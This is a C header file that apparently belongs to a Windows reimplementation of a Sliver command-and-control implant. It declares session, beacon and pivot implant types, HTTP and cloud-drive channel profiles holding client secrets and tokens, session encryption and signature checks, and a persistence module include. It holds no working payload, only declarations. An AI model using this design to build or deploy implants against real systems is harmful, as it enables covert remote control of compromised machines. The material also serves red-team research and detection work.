#pragma once

typedef struct _ENVELOPE ENVELOPE, *PENVELOPE;
typedef struct _SESSION_WORK_WRAPPER SESSION_WORK_WRAPPER, * PSESSION_WORK_WRAPPER;
typedef struct _URI URI, * PURI;
typedef struct _WEB_PROXY WEB_PROXY, * PWEB_PROXY;
typedef struct _SLIVER_DRIVE_CLIENT SLIVER_DRIVE_CLIENT, * PSLIVER_DRIVE_CLIENT;
typedef struct _HTTP_CONFIG HTTP_CONFIG, * PHTTP_CONFIG;
typedef struct _SLIVER_HTTP_CLIENT SLIVER_HTTP_CLIENT, * PSLIVER_HTTP_CLIENT;
typedef struct _SLIVER_BEACON_CLIENT SLIVER_BEACON_CLIENT, * PSLIVER_BEACON_CLIENT;
typedef struct _SLIVER_SESSION_CLIENT SLIVER_SESSION_CLIENT, * PSLIVER_SESSION_CLIENT;
typedef struct _GLOBAL_CONFIG GLOBAL_CONFIG, * PGLOBAL_CONFIG;
typedef struct _HTTP_PROFILE HTTP_PROFILE, * PHTTP_PROFILE;
typedef struct _PIVOT_PROFILE PIVOT_PROFILE, * PPIVOT_PROFILE;
typedef struct _DRIVE_PROFILE DRIVE_PROFILE, * PDRIVE_PROFILE;

typedef LPVOID(WINAPI* CLIENT_INIT)(LPVOID);
typedef BOOL(WINAPI* CLIENT_START)(PGLOBAL_CONFIG, LPVOID);
typedef BOOL(WINAPI* SEND_EVELOPE)(PGLOBAL_CONFIG, LPVOID, PENVELOPE);
typedef PENVELOPE(WINAPI* RECV_EVELOPE)(PGLOBAL_CONFIG, LPVOID);
typedef BOOL(WINAPI* CLIENT_CLOSE)(LPVOID);
typedef BOOL(WINAPI* CLIENT_CLEANUP)(LPVOID);

#include "Handler.h"
#include "Beacon.h"
#include "Http.h"
#include "Drive.h"
#include "Proxy.h"
#include "Uri.h"
#include "Session.h"
#include "Pivot.h"
#include "Socket.h"
#include "NamedPipe.h"
#include "Persistence.h"

typedef enum {
	Http,
	Drive,
	Tcp,
	Udp,
	NamedPipe
} ProtocolType;

typedef enum {
	Session,
	Beacon,
	Pivot
} ImplantType;

struct _GLOBAL_CONFIG {
	CHAR szSessionID[33];
	CHAR PivotSessionID[16];
	LPSTR lpSliverName;
	LPSTR lpConfigID;
	PBYTE pSessionKey;
	PBYTE pPeerSessionKey;
	LPSTR lpRecipientPubKey;
	LPSTR lpPeerPubKey;
	LPSTR lpPeerPrivKey;
	UINT64 uPeerID;
	UINT64 uEncoderNonce;
	LPSTR lpServerMinisignPublicKey;
	LPSTR lpPeerAgePublicKeySignature;
	DWORD dwMaxFailure;
	DWORD dwReconnectInterval;
	HANDLE hMutex;
	DWORD dwListenerID;
	PPIVOT_LISTENER* Listeners;
	DWORD dwNumberOfListeners;
	SRWLOCK RWLock;
	LPWSTR lpScriptPath;
	ProtocolType Protocol;
	ImplantType Type;

	PHTTP_PROFILE* HttpProfiles;
	DWORD cHttpProfiles;
	PDRIVE_PROFILE* DriveProfiles;
	DWORD cDriveProfiles;
	PPIVOT_PROFILE* PivotProfiles;
	DWORD cPivotProfiles;
};

typedef struct _SLIVER_RESP {
	LPSTR lpErrDesc;
	BOOL Async;
	CHAR szBeaconID[0x100];
	CHAR szSessionID[0x100];
} SLIVER_RESP, * PSLIVER_RESP;

typedef struct _SLIVER_THREADPOOL {
	PTP_POOL pPool;
	TP_CALLBACK_ENVIRON CallBackEnviron;
} SLIVER_THREADPOOL, * PSLIVER_THREADPOOL;

typedef struct _SIGNATURE {
	LPSTR lpUntrustedComment;
	BYTE SignatureAlgorithm[2];
	BYTE KeyId[8];
	BYTE Signature[64];
	LPSTR lpTrustedComment;
	BYTE GlobalSignature[64];
} SIGNATURE, *PSIGNATURE;

struct _HTTP_PROFILE {
	LPSTR lpUrl;
	LPSTR* PollPaths;
	DWORD cPollPaths;
	LPSTR* PollFiles;
	DWORD cPollFiles;
	LPSTR* SessionPaths;
	DWORD cSessionPaths;
	LPSTR* SessionFiles;
	DWORD cSessionFiles;
	LPSTR* ClosePaths;
	DWORD cClosePaths;
	LPSTR* CloseFiles;
	DWORD cCloseFiles;
	LPSTR lpUserAgent;
	LPSTR lpOtpSecret;
	DWORD dwMinNumberOfSegments;
	DWORD dwMaxNumberOfSegments;
	DWORD dwPollInterval;
	BOOL UseStandardPort;
};

struct _PIVOT_PROFILE {
	LPSTR lpBindAddress;
	DWORD dwReadDeadline;
	DWORD dwWriteDeadline;
};

struct _DRIVE_PROFILE {
	LPSTR lpClientID;
	LPSTR lpClientSecret;
	LPSTR lpRefreshToken;
	LPSTR lpUserAgent;
	LPSTR lpStartExtension;
	LPSTR lpSendExtension;
	LPSTR lpRecvExtension;
	LPSTR lpRegisterExtension;
	DWORD dwPollInterval;
};

PBUFFER RegisterSliver
(
	_In_ PGLOBAL_CONFIG pConfig
);

PBUFFER MarshalEnvelope
(
	_In_ PENVELOPE pEnvelope
);

VOID FreeEnvelope
(
	_In_ PENVELOPE pEnvelope
);

PSLIVER_THREADPOOL InitializeSliverThreadPool();

VOID FreeSliverThreadPool
(
	_In_ PSLIVER_THREADPOOL pSliverPool
);

PENVELOPE CreateErrorRespEnvelope
(
	_In_ LPSTR lpErrorDesc,
	_In_ DWORD dwFieldIdx,
	_In_ UINT64 uEnvelopeID
);

PENVELOPE UnmarshalEnvelope
(
	_In_ PBUFFER pData
);

//PBUFFER SliverBase64Decode
//(
//	_In_ LPSTR lpInput
//);

PBUFFER SliverDecrypt
(
	_In_ PBYTE pKey,
	_In_ PBUFFER pCipherText
);

PBUFFER SliverEncrypt
(
	_In_ PBYTE pSessionKey,
	_In_ PBUFFER pInput
);

VOID FreeGlobalConfig
(
	_In_ PGLOBAL_CONFIG pConfig
);

PSIGNATURE DecodeMinisignSignature
(
	_In_ LPSTR lpInput
);

BOOL VerifySign
(
	_In_ PMINISIGN_PUB_KEY pPublicKey,
	_In_ PSIGNATURE pSig,
	_In_ PBUFFER pMessage
);

BOOL MinisignVerify
(
	_In_ PBUFFER pMessage,
	_In_ LPSTR lpSignature,
	_In_ LPSTR lpMinisignServerPublicKey
);

PBUFFER AgeDecrypt
(
	_In_ LPSTR lpRecipientPrivateKey,
	_In_ PBUFFER pCipherText
);

PBYTE MarshalWithoutMAC
(
	_In_ PSTANZA_WRAPPER pHdr,
	_In_ PBYTE pHmacKey
);

PSTANZA_WRAPPER ParseStanza
(
	_In_ PBYTE pInputBuffer
);

PBYTE HeaderMAC
(
	_In_ PSTANZA_WRAPPER pHdr,
	_In_ PBYTE pFileKey,
	_In_ DWORD cbFileKey
);

UINT64 GeneratePeerID();

PGLOBAL_CONFIG UnmarshalConfig
(
	_In_ LPWSTR lpConfigPath
);

VOID FreeHttpProfile
(
	_In_ PHTTP_PROFILE pProfile
);

VOID FreeDriveProfile
(
	_In_ PDRIVE_PROFILE pProfile
);

VOID FreePivotProfile
(
	_In_ PPIVOT_PROFILE pProfile
);